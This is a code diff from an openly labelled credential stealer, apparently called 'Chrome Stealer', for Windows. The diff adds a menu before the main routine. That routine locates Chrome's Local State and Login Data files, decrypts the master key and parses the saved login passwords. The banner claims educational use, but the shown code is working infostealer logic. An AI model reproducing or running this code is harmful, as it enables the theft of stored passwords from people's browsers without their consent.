@@ -296,11 +296,17 @@ void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned 
   }
 }
 
+void displayMenu() {
+  printf("Menu:\n");
+  printf("1. Proceed with decryption\n");
+  printf("2. Quit\n");
+  printf("Enter your choice: ");
+}
+
 int main() {
 #ifdef _WIN32
 
-
-  printf("\033[0;35m"  // Set text color to purple
+  printf(YELLOW  // Set text color to purple
     "________________________________________________________________________________________\n"
     "_________ .__                                    _________ __                .__        \n"
     "\\_   ___ \\|  |_________  ____   _____   ____    /   _____//  |_  ____ _____  |  |   ___________\n"
@@ -309,7 +315,7 @@ int main() {
     " \\______  /___|  /__|   \\____/|__|_|  /\\___  > /_______  /|__|  \\___  >____  /____/\\___  >__|   \n"
     "        \\/     \\/                   \\/     \\/          \\/           \\/     \\/          \\/        \n"
     "________________________________________________________________________________________\n"
-    "\033[0m"  // Reset text color
+    RESET  // Reset text color
     "\n"
     "                                Made by Bernking\n"
     "                           For educational purposes only\n"
@@ -319,24 +325,40 @@ int main() {
 
   printf("\n\n");
 
-  if (IsChromeInstalled()) {
-    okay("Google Chrome is installed.");
+  int choice = 0;
+  displayMenu();
+  scanf_s("%d", &choice);
+
+  switch (choice) {
+  case 1:
+    if (IsChromeInstalled()) {
+      okay("Google Chrome is installed.");
+      std::wstring localStatePath = FindLocalState();
+      std::wstring loginDataPath = FindLoginData();
+
+      std::string encryptedKey = getEncryptedKey(localStatePath);
+      DATA_BLOB decryptionKey = decryptKey(encryptedKey);
+
+      int parser = loginDataParser(loginDataPath, decryptionKey);
+
+
+      LocalFree(decryptionKey.pbData);
+    }
+    else {
+      warn("Google Chrome is not installed. Shutting down.");
+    }
+    break;
+  case 2:
+    okay("Exiting the program.");
+    break;
+  default:
+    warn("Invalid choice. Exiting the program.");
+    break;
   }
-  else {
-    warn("Google Chrome is not installed. Shutting down.");
-  }
-
-  std::wstring localStatePath = FindLocalState();
-  std::wstring loginDataPath = FindLoginData();
-
-  std::string encryptedKey = getEncryptedKey(localStatePath);
-  DATA_BLOB decryptionKey = decryptKey(encryptedKey);
-
-  int parser = loginDataParser(loginDataPath, decryptionKey);
-  LocalFree(decryptionKey.pbData);
 
   system("pause");
   return EXIT_SUCCESS;
+
 #else
   warn("This program only runs on Windows systems.\n");
   return EXIT_FAILURE;
